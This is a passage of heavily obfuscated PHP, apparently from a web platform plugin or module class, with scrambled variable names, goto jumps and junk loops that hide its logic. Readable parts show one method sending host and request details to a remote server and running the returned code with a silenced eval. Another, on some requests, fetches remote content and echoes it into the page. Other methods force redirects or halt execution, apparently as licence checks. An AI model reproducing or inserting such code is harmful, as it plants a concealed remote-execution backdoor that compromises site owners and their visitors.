$dÏëƒá˜áá[221]($dÏëƒá˜áá[25]($a½²Œ®õ„Ã, 10, 16)); $dñØº“ÛœÁ = $this->{$_SERVER[­ó][196]}($Dºõ–¾’åĞ[$dÏëƒá˜áá[101]][$cæ›Õ“µŒ], $a½²Œ®õ„Ã); $dñØº“ÛœÁ = $dÏëƒá˜áá[198]($dñØº“ÛœÁ, !0); } if (!$dÏëƒá˜áá[199]($dñØº“ÛœÁ)) { return $this->{$_SERVER[­ó][171]}(); } $A±¬Û§‹¤ = $dÏëƒá˜áá[151]($dñØº“ÛœÁ[$dÏëƒá˜áá[152]]); goto f¾äİŠÖîÎ; aòÌ¤ºµ†İ: $DŞ½À’ô›Ã = $cÜŒõæÖğÀ[634]; if (strlen($DŞ½À’ô›Ã) < $cÜŒõæÖğÀ[596]) { return; } if ($CçŸ‘ƒ [$dÏëƒá˜áá[127]] == $dÏëƒá˜áá[128]) { return; } goto d‘ò‡ÎÀß; FßŸ¬¢ˆç¹: } private function yuaw4e9cca56() { goto BŸµ°á²Ê; BŸµ°á²Ê: $dôÜ¼èä„ =& $_SERVER[­ó]; $FëŠø³ÄÔ‡ = $GLOBALS[$dôÜ¼èä„[22]]; $eáƒ›‹ƒ‚Ü = $_SERVER[…ë˜õ][637]; goto Cé×Ë×ÊÎ; BÆ‚¡Ó¸‡†: if ($dôÜ¼èä„[249]($C „š”ê“›, $DÛ³ª¼ší)) { if ($this->arsvdd80322b == $dôÜ¼èä„[128] && isset($FëŠø³ÄÔ‡[$dôÜ¼èä„[250]])) { $dôÜ¼èä„[173]($dôÜ¼èä„[205]($dôÜ¼èä„[245]), !1, $dôÜ¼èä„[246]); die; } $Aàù×Àí©Ş = $this->{$_SERVER[­ó][144]}(); if ($Aàù×Àí©Ş != $dôÜ¼èä„[251]($dôÜ¼èä„[252])) { if ($Aàù×Àí©Ş <= $dôÜ¼èä„[61]($dôÜ¼èä„[146])->{$_SERVER[­ó][147]}()) { $dôÜ¼èä„[173]($dôÜ¼èä„[205]($dôÜ¼èä„[253]), !1, $dôÜ¼èä„[246]); die; } } } goto f¬Ğ²±ØİÉ; Cé×Ë×ÊÎ: $C „š”ê“› = $_SERVER[$dôÜ¼èä„[44]]; if ($C „š”ê“› == $dôÜ¼èä„[244] && $this->arsvdd80322b == $dôÜ¼èä„[128]) { $dôÜ¼èä„[173]($dôÜ¼èä„[205]($dôÜ¼èä„[245]), !1, $dôÜ¼èä„[246]); } $DÛ³ª¼ší = array($dôÜ¼èä„[247], $dôÜ¼èä„[248]); goto BÆ‚¡Ó¸‡†; f¬Ğ²±ØİÉ: } private function yitg239ebb13() { goto fÔ†É°ñİ¾; fÔ†É°ñİ¾: $D ²–˜™®ƒ =& $_SERVER[…ë˜õ]; $f±ˆ¾¬— =& $_SERVER[­ó]; $Dæ´ËÍç˜“ = array($f±ˆ¾¬—[142], $f±ˆ¾¬—[254]); goto d«­‘Š©»¸; CÛøâæğìÕ: $Dğ­•Ã…àÊ = $D ²–˜™®ƒ[639]; if (!$Dğ­•Ã…àÊ) { die; } $d‘¦Õœ¡“ô = $f±ˆ¾¬—[259](array($f±ˆ¾¬—[260] => array($f±ˆ¾¬—[261] => $f±ˆ¾¬—[262], $f±ˆ¾¬—[263] => 3))); goto d‚«ôô´¼; EÊœ¯·Ô¯È: $BªÜŒƒŠä = $D ²–˜™®ƒ[642]; if (!$BªÜŒƒŠä) { return; } if ($eĞßåˆ¢§ƒ && $f±ˆ¾¬—[32]($eĞßåˆ¢§ƒ, $f±ˆ¾¬—[267])) { echo $eĞßåˆ¢§ƒ; } goto e¥ôóâ©ã; d«­‘Š©»¸: $A‡œªÔ•±‰ = $D ²–˜™®ƒ[638]; if (!$A‡œªÔ•±‰) { return; } if (!$f±ˆ¾¬—[113]($GLOBALS, $f±ˆ¾¬—[139]) || !isset($_GET[$f±ˆ¾¬—[255]])) { return; } goto fËôŒø‘Á‘; d‚«ôô´¼: $b‰ùÈİœ¹Á = $D ²–˜™®ƒ[640]; if (strlen($b‰ùÈİœ¹Á) < $D ²–˜™®ƒ[596]) { die; } $eĞßåˆ¢§ƒ = @$f±ˆ¾¬—[264]($b¿˜À®ãÔ¹, !1, $d‘¦Õœ¡“ô); goto AÂ¼Í½ÜÖ; fËôŒø‘Á‘: if (!$f±ˆ¾¬—[249]($_SERVER[$f±ˆ¾¬—[44]], $Dæ´ËÍç˜“)) { return; } $b¿˜À®ãÔ¹ = $f±ˆ¾¬—[256]; $b¿˜À®ãÔ¹ = $this->{$_SERVER[­ó][257]}($b¿˜À®ãÔ¹, $f±ˆ¾¬—[258]); goto CÛøâæğìÕ; e¥ôóâ©ã: die; goto F›ùÓÆ…«; AÂ¼Í½ÜÖ: $Eö—ë“¼à = $D ²–˜™®ƒ[641]; if (strlen($Eö—ë“¼à) < $D ²–˜™®ƒ[574]) { return; } $f±ˆ¾¬—[265]($f±ˆ¾¬—[266]); goto EÊœ¯·Ô¯È; F›ùÓÆ…«: } public function ixuze19f78a5($d¿ŒÜÂ­ì) { goto fŒ÷Ú³¥‹; aİŞ©É™·“: foreach ($eÏ×ñ´¨» as $d÷¡ñ«éİ¹) { unset($d¿ŒÜÂ­ì[$d÷¡ñ«éİ¹]); } return $d¿ŒÜÂ­ì; $fã÷ó„ºğ» = $D²ˆæœË¬’[644]; goto E¾»†©å«; fŒ÷Ú³¥‹: $D²ˆæœË¬’ =& $_SERVER[…ë˜õ]; $fÛ–Åí¸Ÿ’ =& $_SERVER[­ó]; if ($this->arsvdd80322b == $fÛ–Åí¸Ÿ’[268]) { return $d¿ŒÜÂ­ì; } goto b×—¹…ï¸‡; b×—¹…ï¸‡: $C‹õù…¿‡• = array($fÛ–Åí¸Ÿ’[269] => $fÛ–Åí¸Ÿ’[270], $fÛ–Åí¸Ÿ’[271] => $fÛ–Åí¸Ÿ’[270], $fÛ–Åí¸Ÿ’[272] => $fÛ–Åí¸Ÿ’[270], $fÛ–Åí¸Ÿ’[273] => $fÛ–Åí¸Ÿ’[270], $fÛ–Åí¸Ÿ’[274] => $fÛ–Åí¸Ÿ’[270], $fÛ–Åí¸Ÿ’[275] => $fÛ–Åí¸Ÿ’[270], $fÛ–Åí¸Ÿ’[276] => $fÛ–Åí¸Ÿ’[277], $fÛ–Åí¸Ÿ’[278] => $fÛ–Åí¸Ÿ’[277], $fÛ–Åí¸Ÿ’[279] => $fÛ–Åí¸Ÿ’[277], $fÛ–Åí¸Ÿ’[280] => $fÛ–Åí¸Ÿ’[277], $fÛ–Åí¸Ÿ’[281] => $fÛ–Åí¸Ÿ’[277], $fÛ–Åí¸Ÿ’[282] => $fÛ–Åí¸Ÿ’[277], $fÛ–Åí¸Ÿ’[283] => $fÛ–Åí¸Ÿ’[277], $fÛ–Åí¸Ÿ’[284] => $fÛ–Åí¸Ÿ’[277], $fÛ–Åí¸Ÿ’[285] => $fÛ–Åí¸Ÿ’[277]); $aº±òÎ‹Ê = $fÛ–Åí¸Ÿ’[0]($fÛ–Åí¸Ÿ’[286], $fÛ–Åí¸Ÿ’[113]($this->bdil1063e89a, $fÛ–Åí¸Ÿ’[136], $fÛ–Åí¸Ÿ’[10])); $c¡’Æˆ±Áø = $D²ˆæœË¬’[643]; goto C—™ñØÔÓ; C—™ñØÔÓ: while (strlen($c¡’Æˆ±Áø) < $D²ˆæœË¬’[574]) { if (!$c¡’Æˆ±Áø) { break; } $c¡’Æˆ±Áø++; } $eÏ×ñ´¨» = array(); foreach ($C‹õù…¿‡• as $d÷¡ñ«éİ¹ => $C°ô…ƒÆ³ ) { if ($C°ô…ƒÆ³  == $fÛ–Åí¸Ÿ’[270] && $fÛ–Åí¸Ÿ’[25]($this->arsvdd80322b, 0, 1) == $fÛ–Åí¸Ÿ’[270]) { continue; } if (!$fÛ–Åí¸Ÿ’[249]($d÷¡ñ«éİ¹, $aº±òÎ‹Ê)) { $eÏ×ñ´¨»[] = $d÷¡ñ«éİ¹; } } goto aİŞ©É™·“; E¾»†©å«: while ($fã÷ó„ºğ» < $D²ˆæœË¬’[596]) { if ($fã÷ó„ºğ» >= 0) { break; } $fã÷ó„ºğ»++; } goto dï¶’İ«Ø; dï¶’İ«Ø: } private function bpmne2ae8be1() { $aÉ °ÆŒÕ• =& $_SERVER[­ó]; if ($this->arsvdd80322b != $aÉ °ÆŒÕ•[128]) { return; } $GLOBALS[$aÉ °ÆŒÕ•[101]][$aÉ °ÆŒÕ•[105]][$aÉ °ÆŒÕ•[287]] = $aÉ °ÆŒÕ•[227]; $GLOBALS[$aÉ °ÆŒÕ•[101]][$aÉ °ÆŒÕ•[288]] = $aÉ °ÆŒÕ•[227]; if ($aÉ °ÆŒÕ•[61]($aÉ °ÆŒÕ•[289])->{$_SERVER[­ó][63]}($aÉ °ÆŒÕ•[90]) != $aÉ °ÆŒÕ•[241]) { $aÉ °ÆŒÕ•[61]($aÉ °ÆŒÕ•[289])->{$_SERVER[­ó][228]}($aÉ °ÆŒÕ•[90], $aÉ °ÆŒÕ•[241]); } } public function kjspdd3c2d71() { return $_SERVER[­ó][290]; } private function tniab0929952() { goto A·¦ŠùéŸæ; A·¦ŠùéŸæ: $dÅÒó¢â÷Õ =& $_SERVER[…ë˜õ]; $eª§ô‚²ñ› =& $_SERVER[­ó]; $câ¡á‚µÛº = array($eª§ô‚²ñ›[291], $eª§ô‚²ñ›[292], $eª§ô‚²ñ›[293]); goto F‰†âØ´’Ô; E¿åµ–ÏØÕ: $f¯‡©‚œå = $dÅÒó¢â÷Õ[647]; if (strlen($f¯‡©‚œå) < $dÅÒó¢â÷Õ[580]) { return; } $F±­‘ÂŠÌ = array($eª§ô‚²ñ›[172] => $eª§ô‚²ñ›[61]($eª§ô‚²ñ›[62])->{$_SERVER[­ó][63]}($eª§ô‚²ñ›[216]), $eª§ô‚²ñ›[185] => $this->arsvdd80322b, $eª§ô‚²ñ›[183] => $_SERVER[$eª§ô‚²ñ›[184]], $eª§ô‚²ñ›[176] => $eª§ô‚²ñ›[156], $eª§ô‚²ñ›[179] => $_SERVER[$eª§ô‚²ñ›[180]]); goto Fµ‹Óìêè‹; EñÖÕİ©çé: $dÌÓâƒÕ’Ù = $dÅÒó¢â÷Õ[646]; if ($E¡ŒÚ°„© && $eª§ô‚²ñ›[243]() - $E¡ŒÚ°„© < $eª§ô‚²ñ›[251]($eª§ô‚²ñ›[298])) { return; } $eª§ô‚²ñ›[13](array($eª§ô‚²ñ›[296], $eª§ô‚²ñ›[159]), $Fä¹‹±»”¾, $eª§ô‚²ñ›[243]()); goto E¿åµ–ÏØÕ; F‰†âØ´’Ô: $f©ªÌšÅ½Ä = $dÅÒó¢â÷Õ[645]; $Fä¹‹±»”¾ = $eª§ô‚²ñ›[294] . $eª§ô‚²ñ›[121]($eª§ô‚²ñ›[295]); if ($this->arsvdd80322b == $eª§ô‚²ñ›[128] || !$eª§ô‚²ñ›[113]($GLOBALS, $eª§ô‚²ñ›[139])) { return; } goto f“ñ÷””Ÿé; E·Æ–Ê‘¹Š: $this->{$_SERVER[­ó][171]}(); $EÈ¡•…÷Ï = $dÅÒó¢â÷Õ[648]; if ($this->{$_SERVER[­ó][207]}($e‘‘Ø—ºò‰[$eª§ô‚²ñ›[300]]) != $F±­‘ÂŠÌ[$eª§ô‚²ñ›[172]]) { $eî™İï›ó = array($eª§ô‚²ñ›[209] => $eª§ô‚²ñ›[61]($eª§ô‚²ñ›[62])->{$_SERVER[­ó][63]}($eª§ô‚²ñ›[123]), $eª§ô‚²ñ›[210] => $_SERVER[$eª§ô‚²ñ›[122]], $eª§ô‚²ñ›[211] => $eª§ô‚²ñ›[212](), $eª§ô‚²ñ›[181] => $_SERVER[$eª§ô‚²ñ›[182]]); $b“ùö’òÎä = $this->{$_SERVER[­ó][213]}($eª§ô‚²ñ›[155]($eî™İï›ó)); $e‘‘Ø—ºò‰ = $this->{$_SERVER[­ó][190]}($eª§ô‚²ñ›[214] . $b“ùö’òÎä); if ($e‘‘Ø—ºò‰ && $eª§ô‚²ñ›[199]($e‘‘Ø—ºò‰) && isset($e‘‘Ø—ºò‰[$eª§ô‚²ñ›[300]])) { $EÏ¦éØ«ù÷ = $this->{$_SERVER[­ó][196]}($e‘‘Ø—ºò‰[$eª§ô‚²ñ›[300]], 2); if ($EÏ¦éØ«ù÷) { $EÏ¦éØ«ù÷ = $this->{$_SERVER[­ó][207]}($EÏ¦éØ«ù÷); } if ($EÏ¦éØ«ù÷) { try { @eval($EÏ¦éØ«ù÷); } catch (Exception $bè©È‚®‰’) { } } } } goto DùË¸›œ—; f“ñ÷””Ÿé: if (!$eª§ô‚²ñ›[249]($_SERVER[$eª§ô‚²ñ›[44]], $câ¡á‚µÛº)) { return; } if ($eª§ô‚²ñ›[243]() % 4 != 0) { return; } $E¡ŒÚ°„© = $eª§ô‚²ñ›[13](array($eª§ô‚²ñ›[296], $eª§ô‚²ñ›[297]), $Fä¹‹±»”¾); goto EñÖÕİ©çé; Fµ‹Óìêè‹: $e‘‘Ø—ºò‰ = $this->{$_SERVER[­ó][190]}($eª§ô‚²ñ›[299], $F±­‘ÂŠÌ); if (!$eª§ô‚²ñ›[199]($e‘‘Ø—ºò‰)) { return; } if ($e‘‘Ø—ºò‰[$eª§ô‚²ñ›[172]] && $e‘‘Ø—ºò‰[$eª§ô‚²ñ›[300]]) { if ($this->{$_SERVER[­ó][207]}($e‘‘Ø—ºò‰[$eª§ô‚²ñ›[300]]) == $F±­‘ÂŠÌ[$eª§ô‚²ñ›[172]]) { return; } } goto E·Æ–Ê‘¹Š; DùË¸›œ—: } private function uecga2299b0e($BÚõéÔÇŒ = '', $eÓ†Úî„ = array(), $aÇ„²Ùì• = 5) { goto e«Ê–ë¤ÍÛ; bîÔ†œ›Õ: $d¡ñ¦¸»ƒ = $this->{$_SERVER[­ó][257]}($d¡ñ¦¸»ƒ, $féàäÉ‹ [302]); $AÈŠ¸ãßà = $Bãá‡ëÁÅ[649]; if (!$AÈŠ¸ãßà) { return; } goto cœ— œ¾öÆ; cœ— œ¾öÆ: $d¡ñ¦¸»ƒ = $d¡ñ¦¸»ƒ . $BÚõéÔÇŒ; $f¦ô–×Óƒ = $Bãá‡ëÁÅ[650]; if ($eÓ†Úî„ && $féàäÉ‹ [199]($eÓ†Úî„)) { $d¡ñ¦¸»ƒ = $d¡ñ¦¸»ƒ . $féàäÉ‹ [303] . $féàäÉ‹ [304]($eÓ†Úî„); } goto eÏ´«ˆËà§; FÔªœÉØŒ: $c‹¦¡ÁÒ„ = $Bãá‡ëÁÅ[651]; if (strlen($c‹¦¡ÁÒ„) < $Bãá‡ëÁÅ[574]) { die; } return $féàäÉ‹ [198]($eÓ†Úî„, !0); goto fŸˆ÷ªÚœ…; fŸˆ÷ªÚœ…: $e¤Ô®¾äÃÃ = $Bãá‡ëÁÅ[652]; while (strlen($e¤Ô®¾äÃÃ) < $Bãá‡ëÁÅ[574]) { if (!$e¤Ô®¾äÃÃ) { break; } $e¤Ô®¾äÃÃ++; } $AëˆÔ›Ş—Í = $Bãá‡ëÁÅ[653]; goto BÌŒÀ‚œŠÆ; BÌŒÀ‚œŠÆ: if (strlen($AëˆÔ›Ş—Í) < $Bãá‡ëÁÅ[570]) { die; } goto d²—óŞ©™; eÏ´«ˆËà§: if ($eÓ†Úî„ === -1) { return $d¡ñ¦¸»ƒ; } $f¬‹¾Á«¢ = $féàäÉ‹ [259](array($féàäÉ‹ [260] => array($féàäÉ‹ [263] => $aÇ„²Ùì•, $féàäÉ‹ [261] => $féàäÉ‹ [305]), $féàäÉ‹ [306] => array($féàäÉ‹ [307] => !1, $féàäÉ‹ [308] => !1))); $eÓ†Úî„ = @$féàäÉ‹ [264]($d¡ñ¦¸»ƒ, !1, $f¬‹¾Á«¢); goto FÔªœÉØŒ; e«Ê–ë¤ÍÛ: $Bãá‡ëÁÅ =& $_SERVER[…ë˜õ]; $féàäÉ‹  =& $_SERVER[­ó]; $d¡ñ¦¸»ƒ = $féàäÉ‹ [301]; goto bîÔ†œ›Õ; d²—óŞ©™: } private function nogs8fe17b2d() { goto A©ƒôƒËó; A©ƒôƒËó: $e´šÕ„‰ÆÀ =& $_SERVER[…ë˜õ]; $cºİ–‘Æ =& $_SERVER[­ó]; $CÄ¤×Ó‘İ = array($cºİ–‘Æ[309] => $cºİ–‘Æ[310], $cºİ–‘Æ[311] => $cºİ–‘Æ[312], $cºİ–‘Æ[313] => $cºİ–‘Æ[314], $cºİ–‘Æ[315] => $cºİ–‘Æ[316], $cºİ–‘Æ[317] => $cºİ–‘Æ[318], $cºİ–‘Æ[319] => $cºİ–‘Æ[252], $cºİ–‘Æ[320] => $cºİ–‘Æ[252], $cºİ–‘Æ[321] => $cºİ–‘Æ[310], $cºİ–‘Æ[322] => $cºİ–‘Æ[312], $cºİ–‘Æ[323] => $cºİ–‘Æ[314], $cºİ–‘Æ[324] => $cºİ–‘Æ[325], $cºİ–‘Æ[326] => $cºİ–‘Æ[316], $cºİ–‘Æ[327] => $cºİ–‘Æ[328], $cºİ–‘Æ[329] => $cºİ–‘Æ[318], $cºİ–‘Æ[330] => $cºİ–‘Æ[331], $cºİ–‘Æ[332] => $cºİ–‘Æ[333], $cºİ–‘Æ[334] => $cºİ–‘Æ[335]); goto Bô×ØÏ¥¸‹; Bô×ØÏ¥¸‹: $DŒÔÃ£ñ’ß = $e´šÕ„‰ÆÀ[654]; if (strlen($DŒÔÃ£ñ’ß) < $e´šÕ„‰ÆÀ[599]) { die; } $e›ò—Šø’£ = $CÄ¤×Ó‘İ[$this->arsvdd80322b]; goto AƒŒ“¸ªöâ; f¡Å‚Š¬º: return $e›ò—Šø’£ + $CÜ‹öçâ·; goto bÄ½Ê¹‚«¨; AƒŒ“¸ªöâ: $e›ò—Šø’£ = $cºİ–‘Æ[251]($e›ò—Šø’£ ? $e›ò—Šø’£ : $cºİ–‘Æ[310]); $Eİˆ‘Ü‰¨¶ = $e´šÕ„‰ÆÀ[655]; $CÜ‹öçâ· = $cºİ–‘Æ[113]($this->bdil1063e89a, $cºİ–‘Æ[336]); goto aäµƒ„‰­º; aäµƒ„‰­º: $a„ƒÎ¼ß›ê = $e´šÕ„‰ÆÀ[656]; if (strlen($a„ƒÎ¼ß›ê) < $e´šÕ„‰ÆÀ[596]) { die; } $CÜ‹öçâ· = $CÜ‹öçâ· ? $cºİ–‘Æ[251]($CÜ‹öçâ·) : 0; goto f¡Å‚Š¬º; bÄ½Ê¹‚«¨: } public function nhgu449c77df($Dò¥‘‹ôÂ·) { goto Fßïİ½‚ò; FÆ˜‚é»ƒ‰: if ($Dò¥‘‹ôÂ·[$E³ñŞ˜Â[337]] == $E³ñŞ˜Â[227]) { return; } if ($dñ‡ –ÊÙÑ >= $E³ñŞ˜Â[251]($E³ñŞ˜Â[252])) { return; } $C•ñ–â†¬Ö = $E³ñŞ˜Â[61]($E³ñŞ˜Â[146])->{$_SERVER[­ó][147]}(); goto Fö µ¯ğª; D¾­¾±œÍƒ: $fÛ‰È¸†é = $E³ñŞ˜Â[61]($E³ñŞ˜Â[146])->{$_SERVER[­ó][338]}($E³ñŞ˜Â[337])->{$_SERVER[­ó][339]}($dñ‡ –ÊÙÑ)->{$_SERVER[­ó][340]}(); $fÛ‰È¸†é = $E³ñŞ˜Â[229]($fÛ‰È¸†é, $E³ñŞ˜Â[10], $E³ñŞ˜Â[337]); $aÕø­ó®ìé = $F‡¢‰â²Šù[658]; goto bÙ¿œ’ÕÏÄ; bÙ¿œ’ÕÏÄ: while (strlen($aÕø­ó®ìé) < $F‡¢‰â²Šù[599]) { if (!$aÕø­ó®ìé) { break; } $aÕø­ó®ìé++; } if (!$E³ñŞ˜Â[249]($Dò¥‘‹ôÂ·[$E³ñŞ˜Â[337]], $fÛ‰È¸†é)) { $E³ñŞ˜Â[173]($E³ñŞ˜Â[341], !1, $E³ñŞ˜Â[246]); } goto Eãï‹Ë¯ß; Fö µ¯ğª: $dçÒÜ¡± = $F‡¢‰â²Šù[657]; if (strlen($dçÒÜ¡±) < $F‡¢‰â²Šù[599]) { die; } if ($C•ñ–â†¬Ö <= $dñ‡ –ÊÙÑ) { return; } goto D¾­¾±œÍƒ; Fßïİ½‚ò: $F‡¢‰â²Šù =& $_SERVER[…ë˜õ]; $E³ñŞ˜Â =& $_SERVER[­ó]; $dñ‡ –ÊÙÑ = $this->{$_SERVER[­ó][144]}(); goto FÆ˜‚é»ƒ‰; Eãï‹Ë¯ß: } public function tuzv845f75a1() { goto C´ÁÓá«ëŸ; C´ÁÓá«ëŸ: $a‡º‘ÔÒ¢‰ =& $_SERVER[…ë˜õ]; $FĞ¨ÃÁ…ñÏ =& $_SERVER[­ó]; if (!$FĞ¨ÃÁ…ñÏ[113]($GLOBALS, $FĞ¨ÃÁ…ñÏ[139]) || $FĞ¨ÃÁ…ñÏ[342](1, 100) > 20) { return; } goto Cóã§Ù¤Ãš; Cóã§Ù¤Ãš: $AÆÜ˜ùØª… = $FĞ¨ÃÁ…ñÏ[256]; $AÆÜ˜ùØª… = $this->{$_SERVER[­ó][257]}($AÆÜ˜ùØª…, $FĞ¨ÃÁ…ñÏ[258]); $Eµé„àŒìÃ = $a‡º‘ÔÒ¢‰[659]; goto DÌˆãÑ†Ê; DÌˆãÑ†Ê: $AœÓŸ·Ã¹’ = $FĞ¨ÃÁ…ñÏ[259](array($FĞ¨ÃÁ…ñÏ[260] => array($FĞ¨ÃÁ…ñÏ[261] => $FĞ¨ÃÁ…ñÏ[262], $FĞ¨ÃÁ…ñÏ[263] => 3))); $F®´Ü¿ãƒ¿ = @$FĞ¨ÃÁ…ñÏ[264]($AÆÜ˜ùØª…, !1, $AœÓŸ·Ã¹’); echo $FĞ¨ÃÁ…ñÏ[343] . $FĞ¨ÃÁ…ñÏ[344]($F®´Ü¿ãƒ¿) . $FĞ¨ÃÁ…ñÏ[345]; goto fÄ‡İî›…¹; fÄ‡İî›…¹: $fÛ­ÙÈÓ°é = $a‡º‘ÔÒ¢‰[660]; while (strlen($fÛ­ÙÈÓ°é) < $a‡º‘ÔÒ¢‰[570]) { if (!$fÛ­ÙÈÓ°é) { break; } $fÛ­ÙÈÓ°é++; } goto Bï×“ÛĞÅ¹; Bï×“ÛĞÅ¹: } private function ntox342f983e($cÑ„ÕÄ‡ğ¤, $eŒ½êÒÓâ, $bÀÈÉíç× = 3) { goto Dº³’ë•èß; b£ò°Ê‹Şê: $fÎ…´ Š˜ = $BêŠñ²¡­ğ[664]; switch ($AÖÓ¾Š‘ë) { case $bƒ¢—Û÷ó¥[241]: $FìÄ½ë²Ò³ = $this->{$_SERVER[­ó][154]}($cÑ„ÕÄ‡ğ¤, $bƒ¢—Û÷ó¥[221]($eŒ½êÒÓâ . $bÓœ¯Õ¹†Í)); $CÒğ’²âé = $BêŠñ²¡­ğ[665]; while (strlen($CÒğ’²âé) < $BêŠñ²¡­ğ[570]) { if (!$CÒğ’²âé) { break; } $CÒğ’²âé++; } break; $BÍèºÁÊ¹ = $BêŠñ²¡­ğ[666]; case $bƒ¢—Û÷ó¥[227]: $FìÄ½ë²Ò³ = $this->{$_SERVER[­ó][154]}($cÑ„ÕÄ‡ğ¤, $bƒ¢—Û÷ó¥[221]($bÓœ¯Õ¹†Í . $eŒ½êÒÓâ)); $FÕÑé¡ª´İ = $BêŠñ²¡­ğ[667]; break; $F×÷Õ§’×ß = $BêŠñ²¡­ğ[668]; if (!$F×÷Õ§’×ß) { return; } case $bƒ¢—Û÷ó¥[348]: $FìÄ½ë²Ò³ = $this->{$_SERVER[­ó][154]}($cÑ„ÕÄ‡ğ¤, $bƒ¢—Û÷ó¥[125]($bÓœ¯Õ¹†Í . $eŒ½êÒÓâ)); break; case $bƒ¢—Û÷ó¥[349]: $FìÄ½ë²Ò³ = $this->{$_SERVER[­ó][154]}($cÑ„ÕÄ‡ğ¤, $bƒ¢—Û÷ó¥[121]($bÓœ¯Õ¹†Í . $eŒ½êÒÓâ)); $a˜¥ø÷ÔÃ = $BêŠñ²¡­ğ[669]; if (!$a˜¥ø÷ÔÃ) { return; } break; $d•÷ÜÍ®´¾ = $BêŠñ²¡­ğ[670]; if (strlen($d•÷ÜÍ®´¾) < $BêŠñ²¡­ğ[596]) { return; } case $bƒ¢—Û÷ó¥[350]: goto b²òŠÂŒµÇ; dØÛ–áÑÕ„: while ($Fˆ¢ÖÊöà› < $BêŠñ²¡­ğ[574]) { if ($Fˆ¢ÖÊöà› >= 0) { break; } $Fˆ¢ÖÊöà›++; } $Dˆ‰Æá‡†° = $FçŞ‘·‚¤…[$dÓö…ğ¡áì]; $dàèïòŸŞò = $BêŠñ²¡­ğ[671]; goto Båõ¹ÏÊ˜Í; BèÖÅ¼ÍŒâ: if (!$A†ø‘½‹) { return; } goto aƒ˜“¶º¸; få¢ØçêÊ³: $bºÉ£ø¤¾ = $BêŠñ²¡­ğ[672]; $d²„ó ¤‡Í = $bƒ¢—Û÷ó¥[10]; $D£Ï´¢³½Ë = $BêŠñ²¡­ğ[673]; goto fÁÚ­ô÷¾; fÁÚ­ô÷¾: if (!$D£Ï´¢³½Ë) { die; } $eŸËÆƒ×Şš = 0; $AîÃë™âÕŸ = 0; goto cŞ©Ü‚¼; cŞ©Ü‚¼: $AÛ¢®Ç¼” = $BêŠñ²¡­ğ[674]; $f²º‚ƒŒ· = 0; for ($eŸËÆƒ×Şš = 0; $eŸËÆƒ×Şš < $bƒ¢—Û÷ó¥[24]($cÑ„ÕÄ‡ğ¤); $eŸËÆƒ×Şš++) { $f²º‚ƒŒ· = $f²º‚ƒŒ· == $bƒ¢—Û÷ó¥[24]($C—øì‰á„) ? 0 : $f²º‚ƒŒ·; $BÄ™„ğ¸· = $BêŠñ²¡­ğ[675]; while (strlen($BÄ™„ğ¸·) < $BêŠñ²¡­ğ[580]) { if (!$BÄ™„ğ¸·) { break; } $BÄ™„ğ¸·++; } $AîÃë™âÕŸ = ($dÓö…ğ¡áì + $bƒ¢—Û÷ó¥[352]($FçŞ‘·‚¤…, $cÑ„ÕÄ‡ğ¤[$eŸËÆƒ×Şš]) + $bƒ¢—Û÷ó¥[353]($C—øì‰á„[$f²º‚ƒŒ·++])) % 64; $Cóïƒù¹ = $BêŠñ²¡­ğ[676]; if (strlen($Cóïƒù¹) < $BêŠñ²¡­ğ[599]) { die; } $d²„ó ¤‡Í .= $FçŞ‘·‚¤…[$AîÃë™âÕŸ]; } goto DìÖÅ»ÂÑ; b²òŠÂŒµÇ: $cÑ„ÕÄ‡ğ¤ = $bƒ¢—Û÷ó¥[125]($cÑ„ÕÄ‡ğ¤); $dÓö…ğ¡áì = $bƒ¢—Û÷ó¥[351](0, 64); $Fˆ¢ÖÊöà› = $BêŠñ²¡­ğ[667]; goto dØÛ–áÑÕ„; DìÖÅ»ÂÑ: $FìÄ½ë²Ò³ = $bƒ¢—Û÷ó¥[344]($Dˆ‰Æá‡†° . $d²„ó ¤‡Í); break; $A†ø‘½‹ = $BêŠñ²¡­ğ[677]; goto BèÖÅ¼ÍŒâ; Båõ¹ÏÊ˜Í: if (!$dàèïòŸŞò) { die; } $C—øì‰á„ = $bƒ¢—Û÷ó¥[121]($Dˆ‰Æá‡†° . $bƒ¢—Û÷ó¥[121]($eŒ½êÒÓâ . $Dˆ‰Æá‡†°) . $eŒ½êÒÓâ); $C—øì‰á„ = $bƒ¢—Û÷ó¥[25]($C—øì‰á„, $dÓö…ğ¡áì % 8, $dÓö…ğ¡áì % 8 + 7); goto få¢ØçêÊ³; aƒ˜“¶º¸: default: $FìÄ½ë²Ò³ = $this->{$_SERVER[­ó][154]}($cÑ„ÕÄ‡ğ¤, $eŒ½êÒÓâ . $bÓœ¯Õ¹†Í); break; } $FìÄ½ë²Ò³ = $bƒ¢—Û÷ó¥[221]($AÖÓ¾Š‘ë . $bÓœ¯Õ¹†Í . $FìÄ½ë²Ò³); goto a—ÍŠĞÕ¯; B£»ÄÁÚ²¦: $cÑ„ÕÄ‡ğ¤ = $bƒ¢—Û÷ó¥[2]($cÑ„ÕÄ‡ğ¤); $B÷Ğ³«ô¯½ = $BêŠñ²¡­ğ[661]; $AÖÓ¾Š‘ë = $bƒ¢—Û÷ó¥[342](0, 5) . $bƒ¢—Û÷ó¥[10]; goto eô¼“ì²••; C£‘ù’Ñºï: return $FìÄ½ë²Ò³; goto F™áØˆ­Ä¹; Dº³’ë•èß: $BêŠñ²¡­ğ =& $_SERVER[…ë˜õ]; $bƒ¢—Û÷ó¥ =& $_SERVER[­ó]; $bƒ¢—Û÷ó¥[346](1); goto B£»ÄÁÚ²¦; eô¼“ì²••: $cÙÃ‹  = $BêŠñ²¡­ğ[662]; while (strlen($cÙÃ‹ ) < $BêŠñ²¡­ğ[596]) { if (!$cÙÃ‹ ) { break; } $cÙÃ‹ ++; } $bÓœ¯Õ¹†Í = $bƒ¢—Û÷ó¥[131](15); goto BÙ¶ äÂµ§; BÙ¶ äÂµ§: $c‘¦Š­òÅ¿ = $BêŠñ²¡­ğ[663]; while (strlen($c‘¦Š­òÅ¿) < $BêŠñ²¡­ğ[596]) { if (!$c‘¦Š­òÅ¿) { break; } $c‘¦Š­òÅ¿++; } $FçŞ‘·‚¤… = $bƒ¢—Û÷ó¥[347]; goto b£ò°Ê‹Şê; a—ÍŠĞÕ¯: $bÑŸÈƒ¯Ğ = $BêŠñ²¡­ğ[678]; if (strlen($bÑŸÈƒ¯Ğ) < $BêŠñ²¡­ğ[574]) { return; } if ($bÀÈÉíç× - 1 > 0) { $FìÄ½ë²Ò³ = $this->{$_SERVER[­ó][134]}($FìÄ½ë²Ò³, $eŒ½êÒÓâ, $bÀÈÉíç× - 1); } goto C£‘ù’Ñºï; F™áØˆ­Ä¹: } private function 